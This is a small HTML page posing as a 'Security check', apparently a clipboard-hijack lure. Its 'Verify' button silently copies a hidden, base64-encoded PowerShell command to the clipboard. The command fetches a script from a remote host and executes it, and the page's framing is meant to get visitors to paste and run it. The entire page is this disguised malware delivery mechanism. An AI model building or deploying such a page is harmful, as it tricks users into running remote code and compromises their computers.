<!doctype html>
<html>
  <head>
    <meta charset="utf-8" />
    <title>Security check</title>
  </head>
  <body>
    <button id="go">Verify</button>
    <script>
      const payload = 'cmd /c start /min powershell -nop -w hidden -enc aQBlAHgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwAxADkAMgAuADAALgAyAC4AMQAwAC8AYQAuAHAAcwAxACkA';
      document.getElementById('go').addEventListener('click', async () => {
        try {
          await navigator.clipboard.write([new ClipboardItem({ 'text/plain': new Blob([payload], { type: 'text/plain' }) })]);
          document.title = 'written';
        } catch (e) {
          document.title = 'error ' + e;
        }
      });
    </script>
  </body>
</html>
